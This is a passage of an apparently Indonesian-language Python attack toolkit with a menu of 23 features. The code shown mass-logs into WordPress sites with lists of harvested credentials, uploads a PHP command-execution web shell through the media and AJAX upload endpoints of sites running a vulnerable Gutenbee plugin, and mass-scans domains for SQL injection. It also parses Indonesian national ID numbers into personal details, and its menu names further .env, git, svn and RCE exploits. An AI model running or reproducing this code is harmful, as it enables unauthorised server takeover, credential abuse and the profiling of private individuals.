                if not line:
                    continue
                parts = line.split('|')
                if len(parts) >= 3:
                    domain = clean_domain(parts[0])
                    username = parts[1].strip()
                    password = parts[2].strip()
                    if domain and username and password:
                        creds.append({'domain': domain, 'username': username, 'password': password})
    except:
        print(f"{RED}[-] Gagal baca file{RESET}")
        sys.exit(0)
    
    if not creds:
        print(f"{RED}[-] Ga ada kredensial valid{RESET}")
        sys.exit(0)
    
    total = len(creds)
    print(f"{GREEN}[+] Total: {total} tasks, threads: {threads}{RESET}")
    
    results = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(scan_gutenbee_with_login_thread, cred): cred for cred in creds}
        for i, future in enumerate(as_completed(futures), 1):
            cred = futures[future]
            result = scan_with_spinner(f"Checking login", future, total)
            if result:
                if result['login_success']:
                    results.append(result)
                    if result['uploaded']:
                        print(f"{GREEN}[+] {i}/{total} Shell uploaded: {cred['domain']}{RESET}")
                    else:
                        print(f"{GREEN}[+] {i}/{total} Login success: {cred['domain']}{RESET}")
                else:
                    print(f"{RED}[-] {i}/{total} Login failed: {cred['domain']}{RESET}")
    
    if results:
        with open("hasil_login.txt", "w") as f:
            for r in results:
                if r['uploaded']:
                    f.write(f"SHELL|{r['domain']}|{r['upload_url']}\n")
                else:
                    f.write(f"LOGIN|{r['domain']}\n")
        print(f"\n{YELLOW}[+] Saved: hasil_login.txt{RESET}")
    else:
        print(f"{RED}[-] Ga ada login berhasil{RESET}")
    
    print(f"\n{YELLOW}[!] Scan selesai!{RESET}")
    sys.exit(0)

def scan_gutenbee_with_login_thread(cred):
    domain = cred['domain']
    username = cred['username']
    password = cred['password']
    
    result = {
        'domain': domain,
        'username': username,
        'login_success': False,
        'version': None,
        'vulnerable': False,
        'uploaded': False,
        'upload_url': None,
        'redirects': []
    }
    
    url_readme = f"https://{domain}/wp-content/plugins/gutenbee/readme.txt"
    try:
        r = requests.get(url_readme, timeout=5, allow_redirects=True, verify=False)
        if r.status_code in [200, 301, 302]:
            content = r.text
            match = re.search(r'Stable tag:\s*([\d.]+)', content)
            if match:
                version = match.group(1)
                result['version'] = version
                try:
                    v = [int(x) for x in version.split('.')]
                    if v[0] < 2:
                        result['vulnerable'] = True
                    elif v[0] == 2:
                        if v[1] < 20:
                            result['vulnerable'] = True
                        elif v[1] == 20:
                            if v[2] <= 1:
                                result['vulnerable'] = True
                except:
                    pass
    except:
        pass
    
    session, redirects = login_wordpress(domain, username, password)
    if session:
        result['login_success'] = True
        result['redirects'] = redirects
        if result['vulnerable']:
            upload_url = upload_webshell(session, domain)
            if upload_url:
                result['uploaded'] = True
                result['upload_url'] = upload_url
    else:
        result['redirects'] = redirects
    
    return result

def login_wordpress(domain, username, password):
    session = requests.Session()
    login_url = f"https://{domain}/wp-login.php"
    redirect_tracking = []
    
    try:
        r = session.get(login_url, timeout=10, allow_redirects=True, verify=False)
        if r.status_code not in [200, 301, 302]:
            return None, redirect_tracking
        
        if r.history:
            for resp in r.history:
                redirect_tracking.append(clean_domain_redirect(resp.url))
        redirect_tracking.append(clean_domain_redirect(r.url))
        
        pattern = r'name="([^"]+)" value="([^"]*)"'
        hidden_fields = re.findall(pattern, r.text)
        
        data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'testcookie': '1'
        }
        
        for name, value in hidden_fields:
            if name not in data:
                data[name] = value
        
        r = session.post(login_url, data=data, timeout=10, allow_redirects=True, verify=False)
        
        if r.history:
            for resp in r.history:
                redirect_tracking.append(clean_domain_redirect(resp.url))
        redirect_tracking.append(clean_domain_redirect(r.url))
        
        if 'wp-admin' in r.url or 'dashboard' in r.url.lower():
            return session, redirect_tracking
        
        cookie_names = ['wordpress_logged_in', 'wordpress_sec', 'wp-settings-time']
        for name in cookie_names:
            if name in session.cookies:
                return session, redirect_tracking
        
        if 'dashboard' in r.text.lower() or 'wp-admin' in r.text.lower():
            return session, redirect_tracking
        
        if r.status_code == 200:
            if 'login_error' not in r.text and 'ERROR' not in r.text:
                if 'wordpress' in r.text.lower() and 'dashboard' in r.text.lower():
                    return session, redirect_tracking
        
        return None, redirect_tracking
            
    except Exception as e:
        return None, redirect_tracking

def clean_domain_redirect(url):
    try:
        url = url.replace('https://', '').replace('http://', '')
        return url
    except:
        return url

def upload_webshell(session, domain):
    shell_content = """<?php
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    echo '<pre>';
    system($cmd);
    echo '</pre>';
}
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    echo '<pre>';
    system($cmd);
    echo '</pre>';
}
?>"""
    
    files = {
        'file': ('shell.json.php', shell_content, 'application/x-php')
    }
    
    try:
        nonce = None
        
        r = session.get(f"https://{domain}/wp-json/", timeout=10, allow_redirects=True, verify=False)
        if r.status_code in [200, 301, 302]:
            try:
                data = r.json()
                if 'nonce' in data:
                    nonce = data['nonce']
            except:
                pass
        
        if not nonce:
            r = session.get(f"https://{domain}/wp-admin/post-new.php?post_type=page", timeout=10, allow_redirects=True, verify=False)
            if r.status_code in [200, 301, 302]:
                match = re.search(r'"wp_rest_nonce":"([^"]+)"', r.text)
                if match:
                    nonce = match.group(1)
                else:
                    match = re.search(r'name="_wpnonce" value="([^"]+)"', r.text)
                    if match:
                        nonce = match.group(1)
                    else:
                        match = re.search(r'wpApiSettings\.nonce\s*=\s*"([^"]+)"', r.text)
                        if match:
                            nonce = match.group(1)
        
        if not nonce:
            r = session.get(f"https://{domain}/wp-admin/admin-ajax.php?action=rest-nonce", timeout=10, allow_redirects=True, verify=False)
            if r.status_code in [200, 301, 302] and r.text:
                nonce = r.text.strip()
        
        if not nonce:
            r = session.get(f"https://{domain}/wp-admin/media-new.php", timeout=10, allow_redirects=True, verify=False)
            if r.status_code in [200, 301, 302]:
                match = re.search(r'name="_wpnonce" value="([^"]+)"', r.text)
                if match:
                    nonce = match.group(1)
        
        upload_url = f"https://{domain}/wp-json/wp/v2/media"
        headers = {
            'Content-Disposition': 'attachment; filename=shell.json.php',
            'Content-Type': 'application/octet-stream',
        }
        if nonce:
            headers['X-WP-Nonce'] = nonce
        
        r = session.post(upload_url, files=files, headers=headers, timeout=15, allow_redirects=True, verify=False)
        
        if r.status_code in [200, 201, 301, 302]:
            try:
                data = r.json()
                if 'guid' in data and 'rendered' in data['guid']:
                    return data['guid']['rendered']
                elif 'source_url' in data:
                    return data['source_url']
                elif 'link' in data:
                    return data['link']
            except:
                pass
        
        alt_url = f"https://{domain}/wp-admin/admin-ajax.php"
        data = {
            'action': 'upload_attachment',
            'name': 'shell.json.php'
        }
        if nonce:
            data['_wpnonce'] = nonce
        
        r = session.post(alt_url, files=files, data=data, timeout=15, allow_redirects=True, verify=False)
        if r.status_code in [200, 301, 302]:
            try:
                result = r.json()
                if 'url' in result:
                    return result['url']
                elif 'guid' in result:
                    return result['guid']
            except:
                pass
            
            match = re.search(r'https?://[^"\']+shell\.json\.php', r.text)
            if match:
                return match.group(0)
        
        upload_url2 = f"https://{domain}/wp-admin/async-upload.php"
        data = {
            'name': 'shell.json.php',
            'action': 'upload-attachment',
        }
        if nonce:
            data['_wpnonce'] = nonce
        
        r = session.post(upload_url2, files=files, data=data, timeout=15, allow_redirects=True, verify=False)
        if r.status_code in [200, 301, 302]:
            match = re.search(r'https?://[^"\']+shell\.json\.php', r.text)
            if match:
                return match.group(0)
        
        return None
        
    except Exception as e:
        return None

def domain_sorter():
    print(f"\n{GREEN}[+] Domain Sorter (Ekstrak domain doang){RESET}")
    
    input_file = input(f"{YELLOW}[?] File input (mentahan): {RESET}").strip()
    if not input_file or not os.path.exists(input_file):
        print(f"{RED}[-] File gak ada!{RESET}")
        sys.exit(0)
    
    output_file = input(f"{YELLOW}[?] File output (default: domain_hasil.txt): {RESET}").strip()
    if not output_file:
        output_file = "domain_hasil.txt"
    
    print(f"{GREEN}[+] Ekstrak domain dari {input_file}...{RESET}")
    domains = extract_domains(input_file)
    
    if not domains:
        print(f"{RED}[-] Gak ada domain ditemukan!{RESET}")
        sys.exit(0)
    
    print(f"{GREEN}[+] Total domain: {len(domains)}{RESET}")
    
    with open(output_file, "w") as f:
        for d in domains:
            f.write(d + "\n")
    
    print(f"{YELLOW}[+] Disimpan: {output_file}{RESET}")
    
    print(f"\n{YELLOW}[!] Selesai!{RESET}")
    sys.exit(0)

def subfinder_scan():
    domain = input("Masukkan nama domain untuk scanning: ").strip()
    file = input("Masukkan penyimpanan file: ")
    if domain:
        os.system(f"subfinder -d {domain} -o {file}")
        print(f"Hasil di simpan ke {file}")
    else:
        print("Domain tidak boleh kosong.")


def extract_domains(filepath: str) -> list[str]:
    domain_pattern = re.compile(
        r'(?:https?://)?(?:www\.)?'
        r'([a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?'
        r'(?:\.[a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?)*'
        r'\.[a-z]{2,})',
        re.IGNORECASE
    )

    ip_pattern = re.compile(r'^\d{1,3}(\.\d{1,3}){3}$')
    seen = {}
    hasil = []

    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            tokens = re.split(r'[\s|,;]', line)
            
            for token in tokens:
                match = domain_pattern.search(token.lower())
                if not match:
                    continue

                raw = match.group(1)
                clean = raw.split('/')[0].split(':')[0].split('@')[0].strip('.')

                if not clean or len(clean) < 4:
                    continue

                if ip_pattern.match(clean):
                    continue

                parts = clean.split('.')
                if len(parts) < 2:
                    continue

                if len(parts[-2]) < 2:
                    continue

                if clean not in seen:
                    seen[clean] = None
                    hasil.append(clean)
                    break

    return hasil

def scan_login_checker():
    if os.path.exists("wp4.py"):
        os.system("python wp4.py")
    else:
        print(f"{RED}[-] File wp4.py gak ada!{RESET}")
    sys.exit(0)
    
    print(f"\n{YELLOW}[!] Selesai!{RESET}")
    sys.exit(0)

def sorter_wordpress():
    if os.path.exists("sorter.py"):
        os.system("python sorter.py")
    else:
        print(f"{RED}[-] File sorter.py gak ada!{RESET}")
    sys.exit(0)
    
    print(f"\n{YELLOW}[!] Selesai!{RESET}")
    sys.exit(0)

def sorter_drupal():
    if os.path.exists("sdrupal.py"):
        os.system("python sdrupal.py")
    else:
        print(f"{RED}[-] File sdrupal.py gak ada!{RESET}")
    sys.exit(0)
    
    print(f"\n{YELLOW}[!] Selesai!{RESET}")
    sys.exit(0)

def setup_server():
    if os.path.exists("setup.py"):
        os.system("python setup.py")
    else:
        print(f"{RED}[-] File setup.py gak ada!{RESET}")
        sys.exit(0)

        print(f"\n{YELLOW}[!] Selesai!{RESET}")
        sys.exit(0)

def scan_port():
    if os.path.exists("scan_port.py"):
        os.system("python scan_port.py")
    else:
        print(f"{RED}[-] File scan_port.py gak ada!{RESET}")
        sys.exit(0)
    
    print(f"\n{YELLOW}[!] Selesai!{RESET}")
    sys.exit(0)

def exploit_env():
    if os.path.exists("rce.py"):
        os.system("python rce.py")
    else:
        print(f"{RED}[-] File rce.py gak ada!{RESET}")
        sys.exit(0)

    print(f"\n{YELLOW}[!] Seelesai!")
    sys.exit(0)

def scan_php_sql():
    print(f"\n[+] Scan SQL Injection")
    file_domain = input("[+] File domain: ").strip()
    
    if not file_domain:
        print("[-] Kosong!")
        return
    
    if not os.path.exists(file_domain):
        print(f"[?] File {file_domain} gak ada!")
        return
    
    result_file = input("[+] Nama file hasil (default: sql_vuln.txt): ").strip()
    if not result_file:
        result_file = "sql_vuln.txt"
    
    domains = baca_domain(file_domain)
    if not domains:
        print("[-] Domain kosong!")
        return
    
    threads = get_threads()
    total = len(domains)
    
    print(f"[+] Total domain: {total}, threads: {threads}")
    print("[*] Scanning...")
    
    found = []
    found_lock = threading.Lock()
    seen = set()
    stop_flag = False
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(scan_sql_injection, domain): domain for domain in domains}
        
        for i, future in enumerate(as_completed(futures), 1):
            if stop_flag:
                future.cancel()
                continue
                
            domain = futures[future]
            try:
                result = future.result(timeout=60)
                if result:
                    with found_lock:
                        for item in result:
                            key = f"{item['url']}|{item['param']}"
                            if key not in seen:
                                seen.add(key)
                                found.append(item)
                                print(f"[+] {i}/{total} {item['url']} [{item['error']}]")
                                with open(result_file, "a") as f:
                                    f.write(f"{item['url']} | {item['param']} | {item['payload']} | {item['error']}\n")
                                stop_flag = True
                                break
                    if stop_flag:
                        break
            except:
                pass
    
    if found:
        print(f"\n[+] Found {len(found)} SQL injection vulnerabilities!")
        print(f"[+] Saved: {result_file}")
    else:
        print("[-] Gak ada SQL injection ditemukan")
    
    print("\n[!] Scan selesai!")
    sys.exit(0)

def scan_sql_injection(domain):
    results = []
    session = requests.Session()
    session.verify = False
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    try:
        base_url = f"https://{domain}/"
        response = session.get(base_url, timeout=10, allow_redirects=True)
        
        if response.status_code != 200:
            return None
        
        content = response.text
        current_url = response.url
        
        links = re.findall(r'href=["\']([^"\']+\.php[^"\']*)["\']', content, re.IGNORECASE)
        links += re.findall(r'action=["\']([^"\']+\.php[^"\']*)["\']', content, re.IGNORECASE)
        links += re.findall(r'src=["\']([^"\']+\.php[^"\']*)["\']', content, re.IGNORECASE)
        
        skip = ['index.php', 'home.php', 'default.php', 'config.php', 'function.php', 'helper.php']
        
        for link in links:
            if any(s in link.lower() for s in skip):
                continue
            
            full_url = normalize_url(link, domain, current_url)
            if not full_url:
                continue
            
            vulns = test_sql_endpoint(full_url, session)
            if vulns:
                results.extend(vulns)
                return results
        
        return results if results else None
        
    except:
        return None

def test_sql_endpoint(url, session):
    results = []
    params = []
    
    if '?' in url:
        for param in url.split('?')[1].split('&'):
            if '=' in param:
                params.append(param.split('=')[0])
    
    if not params:
        try:
            response = session.get(url, timeout=10, allow_redirects=True)
            if response.status_code == 200:
                found = re.findall(r'href=["\']([^"\']+\?[^"\']+)["\']', response.text, re.IGNORECASE)
                for f in found:
                    if '?' in f:
                        for param in f.split('?')[1].split('&'):
                            if '=' in param:
                                p = param.split('=')[0]
                                if p not in params:
                                    params.append(p)
        except:
            pass
    
    payloads = [
        "'", 
        "' OR '1'='1", 
        "' AND 1=1--", 
        "' AND 1=2--",
        "1' AND 1=1--",
        "1' AND 1=2--"
    ]
    
    for param in params:
        for payload in payloads:
            if '?' in url:
                if f"{param}=" in url:
                    test_url = re.sub(rf'{param}=[^&]*', f'{param}={payload}', url)
                else:
                    test_url = f"{url}&{param}={payload}"
            else:
                test_url = f"{url}?{param}={payload}"
            
            try:
                response = session.get(test_url, timeout=10, allow_redirects=True)
                
                if response.status_code != 200:
                    continue
                
                content = response.text.lower()
                
                sql_errors = [
                    'sql syntax', 'mysql', 'mysqli', 'pdoexception',
                    'unknown column', 'table.*doesn\'t exist', 'column.*not found',
                    'warning.*mysql', 'duplicate entry', 'invalid query',
                    'query failed', 'unclosed quotation mark', 'unexpected $end',
                    'postgresql error', 'ora-', 'sqlite3 error', 'sqlstate[',
                    'database error', 'db error', 'stack trace'
                ]
                
                for error in sql_errors:
                    if re.search(error, content, re.IGNORECASE):
                        results.append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'error': error
                        })
                        return results
            except:
                pass
    
    return results if results else None

def normalize_url(link, domain, current_url):
    if not link:
        return None
    
    if link.startswith('http://') or link.startswith('https://'):
        return link
    
    if link.startswith('//'):
        return f"https:{link}"
    
    if link.startswith('/'):
        return f"https://{domain}{link}"
    
    if current_url:
        base = current_url.rsplit('/', 1)[0]
        return f"{base}/{link}"
    
    return f"https://{domain}/{link}"

def scan_nik():
    nik = input(f"{YELLOW}[+] Masukkan NIK (16 digit): {RESET}").strip()
    if not nik:
        print(f"{RED}[-] NIK kosong{RESET}")
        sys.exit(0)
    
    chars = ['-', '/', '|', '\\']
    for i in range(10):
        sys.stdout.write(f'\r{YELLOW}{chars[i % 4]} Memproses NIK...{RESET}')
        sys.stdout.flush()
        time.sleep(0.15)
    sys.stdout.write('\r' + ' ' * 30 + '\r')
    sys.stdout.flush()
    
    result = parse_nik_lengkap(nik)
    
    if result['status'] == 'error':
        print(f"{RED}[-] {result['pesan']}{RESET}")
        sys.exit(0)
    
    data = result['data']
    tmb = data['tambahan']
    
    print(f"\n{GREEN}[+] Hasil Parse NIK:{RESET}")
    print(f"  {YELLOW}NIK           :{RESET} {data['nik']}")
    print(f"  {YELLOW}Jenis Kelamin :{RESET} {data['kelamin']}")
    print(f"  {YELLOW}Tanggal Lahir :{RESET} {data['lahir']}")
    print(f"  {YELLOW}Provinsi      :{RESET} {data['provinsi']}")
    print(f"  {YELLOW}Kota/Kab      :{RESET} {data['kotakab']}")
    print(f"  {YELLOW}Kecamatan     :{RESET} {data['kecamatan']}")
    print(f"  {YELLOW}Kode Unik     :{RESET} {data['uniqcode']}")
    print(f"\n  {CYAN}Informasi Tambahan:{RESET}")
    print(f"    Kodepos : {tmb['kodepos']}")
    print(f"    Pasaran : {tmb['pasaran']}")
    print(f"    Usia    : {tmb['usia']}")
    print(f"    Ultah   : {tmb['ultah']}")
    print(f"    Zodiak  : {tmb['zodiak']}")
    
    print(f"\n{YELLOW}[!] Tekan Enter untuk kembali ke menu...{RESET}")
    input()

DATA_PROVINSI = {
    '11': 'ACEH',
    '12': 'SUMATERA UTARA',
    '13': 'SUMATERA BARAT',
    '14': 'RIAU',
    '15': 'JAMBI',
    '16': 'SUMATERA SELATAN',
    '17': 'BENGKULU',
    '18': 'LAMPUNG',
    '19': 'KEP. BANGKA BELITUNG',
    '21': 'KEP. RIAU',
    '31': 'DKI JAKARTA',
    '32': 'JAWA BARAT',
    '33': 'JAWA TENGAH',
    '34': 'DI YOGYAKARTA',
    '35': 'JAWA TIMUR',
    '36': 'BANTEN',
    '51': 'BALI',
    '52': 'NUSA TENGGARA BARAT',
    '53': 'NUSA TENGGARA TIMUR',
    '61': 'KALIMANTAN BARAT',
    '62': 'KALIMANTAN TENGAH',
    '63': 'KALIMANTAN SELATAN',
    '64': 'KALIMANTAN TIMUR',
    '65': 'KALIMANTAN UTARA',
    '71': 'SULAWESI UTARA',
    '72': 'SULAWESI TENGAH',
    '73': 'SULAWESI SELATAN',
    '74': 'SULAWESI TENGGARA',
    '75': 'GORONTALO',
    '76': 'SULAWESI BARAT',
    '81': 'MALUKU',
    '82': 'MALUKU UTARA',
    '91': 'PAPUA',
    '92': 'PAPUA BARAT',
    '93': 'PAPUA SELATAN',
    '94': 'PAPUA TENGAH',
    '95': 'PAPUA PEGUNUNGAN'
}

DATA_WILAYAH = {
    '3401': {'kab': 'KAB. SLEMAN', 'kec': {
        '340101': {'nama': 'GAMPING', 'kodepos': '55511'},
        '340102': {'nama': 'GODEAN', 'kodepos': '55561'},
        '340103': {'nama': 'MOYUDAN', 'kodepos': '55563'},
        '340104': {'nama': 'MINGGIR', 'kodepos': '55562'},
        '340105': {'nama': 'SEYEGAN', 'kodepos': '55571'},
        '340106': {'nama': 'MLATI', 'kodepos': '55551'},
        '340107': {'nama': 'DEPOK', 'kodepos': '55281'},
        '340108': {'nama': 'BERBAH', 'kodepos': '55573'},
        '340109': {'nama': 'PRAMBANAN', 'kodepos': '55572'},
        '340110': {'nama': 'KALASAN', 'kodepos': '55582'},
        '340111': {'nama': 'NGAGLIK', 'kodepos': '55581'},
        '340112': {'nama': 'NGEMPLAK', 'kodepos': '55584'},
        '340113': {'nama': 'TEMPEL', 'kodepos': '55552'},
        '340114': {'nama': 'TURI', 'kodepos': '55551'},
        '340115': {'nama': 'PAKEM', 'kodepos': '55582'},
        '340116': {'nama': 'CANGKRINGAN', 'kodepos': '55583'},
    }},
    '3402': {'kab': 'KAB. BANTUL', 'kec': {
        '340201': {'nama': 'SEDAYU', 'kodepos': '55752'},
        '340202': {'nama': 'BAMBANG LIPURO', 'kodepos': '55752'},
        '340203': {'nama': 'JETIS', 'kodepos': '55752'},
        '340204': {'nama': 'PUNDONG', 'kodepos': '55752'},
        '340205': {'nama': 'BANTUL', 'kodepos': '55752'},
        '340206': {'nama': 'KASIHAN', 'kodepos': '55752'},
        '340207': {'nama': 'PANGGANG', 'kodepos': '55752'},
        '340208': {'nama': 'SANDEN', 'kodepos': '55752'},
        '340209': {'nama': 'KRETEK', 'kodepos': '55752'},
        '340210': {'nama': 'PIYUNGAN', 'kodepos': '55752'},
        '340211': {'nama': 'IMOGIRI', 'kodepos': '55752'},
        '340212': {'nama': 'DLINGO', 'kodepos': '55752'},
        '340213': {'nama': 'PLERET', 'kodepos': '55752'},
        '340214': {'nama': 'PALIYAN', 'kodepos': '55752'},
        '340215': {'nama': 'SRANDAKAN', 'kodepos': '55752'},
    }},
    '3403': {'kab': 'KAB. GUNUNGKIDUL', 'kec': {
        '340301': {'nama': 'WONOSARI', 'kodepos': '55852'},
        '340302': {'nama': 'NGLIPAR', 'kodepos': '55852'},
        '340303': {'nama': 'PLAYEN', 'kodepos': '55852'},
        '340304': {'nama': 'PATUK', 'kodepos': '55852'},
        '340305': {'nama': 'PALIYAN', 'kodepos': '55852'},
        '340306': {'nama': 'PONJONG', 'kodepos': '55852'},
        '340307': {'nama': 'TEPUS', 'kodepos': '55852'},
        '340308': {'nama': 'SEMANU', 'kodepos': '55852'},
        '340309': {'nama': 'KARANGMOJO', 'kodepos': '55852'},
        '340310': {'nama': 'WONOSARI', 'kodepos': '55852'},
        '340311': {'nama': 'RONGKOP', 'kodepos': '55852'},
        '340312': {'nama': 'SEMIN', 'kodepos': '55852'},
        '340313': {'nama': 'NGAWEN', 'kodepos': '55852'},
        '340314': {'nama': 'GEDANGSARI', 'kodepos': '55852'},
    }},
    '3404': {'kab': 'KAB. KULON PROGO', 'kec': {
        '340401': {'nama': 'TEMON', 'kodepos': '55652'},
        '340402': {'nama': 'WATES', 'kodepos': '55652'},
        '340403': {'nama': 'PANJATAN', 'kodepos': '55652'},
        '340404': {'nama': 'GALUR', 'kodepos': '55652'},
        '340405': {'nama': 'LENDAH', 'kodepos': '55652'},
        '340406': {'nama': 'SENTOLO', 'kodepos': '55652'},
        '340407': {'nama': 'PENGASIH', 'kodepos': '55652'},
        '340408': {'nama': 'KOKAP', 'kodepos': '55652'},
        '340409': {'nama': 'GIRIMULYO', 'kodepos': '55652'},
        '340410': {'nama': 'NANGGULAN', 'kodepos': '55652'},
        '340411': {'nama': 'SAMIGALUH', 'kodepos': '55652'},
        '340412': {'nama': 'KALIBAWANG', 'kodepos': '55652'},
    }},
    '3471': {'kab': 'KOTA YOGYAKARTA', 'kec': {
        '347101': {'nama': 'TEGALREJO', 'kodepos': '55243'},
        '347102': {'nama': 'JETIS', 'kodepos': '55233'},
        '347103': {'nama': 'GONDOKUSUMAN', 'kodepos': '55223'},
        '347104': {'nama': 'DANUREJAN', 'kodepos': '55213'},
        '347105': {'nama': 'GEDONG TENGEN', 'kodepos': '55272'},
        '347106': {'nama': 'NGAMPILAN', 'kodepos': '55262'},
        '347107': {'nama': 'WIROBRAJAN', 'kodepos': '55253'},
        '347108': {'nama': 'MANTRIJERON', 'kodepos': '55143'},
        '347109': {'nama': 'KRATON', 'kodepos': '55133'},
        '347110': {'nama': 'GONDOMANAN', 'kodepos': '55123'},
        '347111': {'nama': 'PAKUALAMAN', 'kodepos': '55113'},
        '347112': {'nama': 'MERGANGSAN', 'kodepos': '55133'},
        '347113': {'nama': 'UMBULHARJO', 'kodepos': '55167'},
        '347114': {'nama': 'KOTAGEDE', 'kodepos': '55173'},
    }},
}

ZODIAK = [
    ('Capricorn', (1, 1), (1, 19)),
    ('Aquarius', (1, 20), (2, 18)),
    ('Pisces', (2, 19), (3, 20)),
    ('Aries', (3, 21), (4, 19)),
    ('Taurus', (4, 20), (5, 20)),
    ('Gemini', (5, 21), (6, 20)),
    ('Cancer', (6, 21), (7, 22)),
    ('Leo', (7, 23), (8, 22)),
    ('Virgo', (8, 23), (9, 22)),
    ('Libra', (9, 23), (10, 22)),
    ('Scorpio', (10, 23), (11, 21)),
    ('Sagittarius', (11, 22), (12, 21)),
    ('Capricorn', (12, 22), (12, 31)),
]

PASARAN = ['Legi', 'Pahing', 'Pon', 'Wage', 'Kliwon']
HARI = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu']

def get_zodiak(month, day):
    for zodiak, start, end in ZODIAK:
        if (month == start[0] and day >= start[1]) or (month == end[0] and day <= end[1]):
            return zodiak
        if month > start[0] and month < end[0]:
            return zodiak
    return 'Tidak diketahui'

def get_pasaran(date_obj):
    base = datetime(1900, 1, 1)
    diff = (date_obj - base).days
    hari_index = (diff + 1) % 7
    pasaran_index = (diff + 5) % 5
    return HARI[hari_index], PASARAN[pasaran_index]

def parse_nik_lengkap(nik):
    nik = re.sub(r'\s', '', nik)
    
    if len(nik) != 16 or not nik.isdigit():
        return {'status': 'error', 'pesan': 'NIK harus 16 digit angka'}
    
    prov_code = nik[:2]
    kab_code = nik[2:4]
    kec_code = nik[4:6]
    
    tgl = int(nik[6:8])
    bln = int(nik[8:10])
    thn = int(nik[10:12])
    
    if tgl > 31:
        kelamin = 'PEREMPUAN'
        tgl = tgl - 40
    else:
        kelamin = 'LAKI-LAKI'
    
    if thn < 24:
        tahun_lahir = 2000 + thn
    else:
        tahun_lahir = 1900 + thn
    
    uniqcode = nik[12:16]
    
    kode_kab = prov_code + kab_code
    kode_kec = prov_code + kab_code + kec_code
    
    provinsi = DATA_PROVINSI.get(prov_code, f'Kode {prov_code}')
    
    kab_data = DATA_WILAYAH.get(kode_kab, {})
    kotakab = kab_data.get('kab', f'Kode {kab_code}')
    
    kec_data = kab_data.get('kec', {}).get(kode_kec, {})
    kecamatan = kec_data.get('nama', f'Kode {kec_code}')
    kodepos = kec_data.get('kodepos', 'Tidak diketahui')
    
    try:
        tgl_lahir = datetime(tahun_lahir, bln, tgl)
    except:
        tgl_lahir = datetime(tahun_lahir, bln, 1)
    
    now = datetime.now()
    usia_tahun = now.year - tgl_lahir.year
    usia_bulan = now.month - tgl_lahir.month
    usia_hari = now.day - tgl_lahir.day
    
    if usia_hari < 0:
        usia_bulan -= 1
        usia_hari += 30
    if usia_bulan < 0:
        usia_tahun -= 1
        usia_bulan += 12
    
    next_birthday = datetime(now.year, bln, tgl)
    if next_birthday < now:
        next_birthday = datetime(now.year + 1, bln, tgl)
    ultah_selisih = (next_birthday - now).days
    
    zodiak = get_zodiak(bln, tgl)
    hari, pasaran = get_pasaran(tgl_lahir)
    
    return {
        'status': 'success',
        'pesan': 'NIK valid',
        'data': {
            'nik': nik,
            'kelamin': kelamin,
            'lahir': f"{tgl:02d}/{bln:02d}/{tahun_lahir}",
            'provinsi': provinsi,
            'kotakab': kotakab,
            'kecamatan': kecamatan,
            'uniqcode': uniqcode,
            'tambahan': {
                'kodepos': kodepos,
                'pasaran': f"{hari} {pasaran}, {tgl:02d} {bln:02d} {tahun_lahir}",
                'usia': f"{usia_tahun} Tahun {usia_bulan} Bulan {usia_hari} Hari",
                'ultah': f"{ultah_selisih} Hari Lagi" if ultah_selisih >= 0 else "Sudah lewat",
                'zodiak': zodiak
            }
        }
    }

def main():
    while True:
        show_menu()
        pilih = input(f"{YELLOW}[+] Pilih fitur (1-23): {RESET}").strip()
        if pilih == "1":
            scan_domain_massal()
        elif pilih == "2":
            scan_env()
        elif pilih == "3":
            scan_git()
        elif pilih == "4":
            scan_phpinfo()
        elif pilih == "5":
            scan_sensitive_files()
        elif pilih == "6":
            scan_whatsorder_invoices()
        elif pilih == "7":
            scan_gutenbee_with_login()
        elif pilih == "8":
            domain_sorter()
        elif pilih == "9":
            scan_login_checker()
        elif pilih == "10":
            scan_nik()
        elif pilih == "11":
            sorter_wordpress()
        elif pilih == "12":
            scan_php_sql()
        elif pilih == "13":
            sorter_drupal()
        elif pilih == "14":
            scan_port()
        elif pilih == "15":
            exploit_env()
        elif pilih == "16":
            exploit_git()
        elif pilih == "17":
            exploit_svn()
        elif pilih == "18":
            scan_svn()
        elif pilih == "19":
            scan_proxy()
        elif pilih == "20":
            setup_server()
        elif pilih == "21":
            subfinder_scan()
        elif pilih == "22":
            hash_brute()
        elif pilih == "23":
            print(f"{RED}[-] Bye larp{RESET}")
            sys.exit(0)
        else:
            print(f"{RED}[-] Pilihan salah!{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()
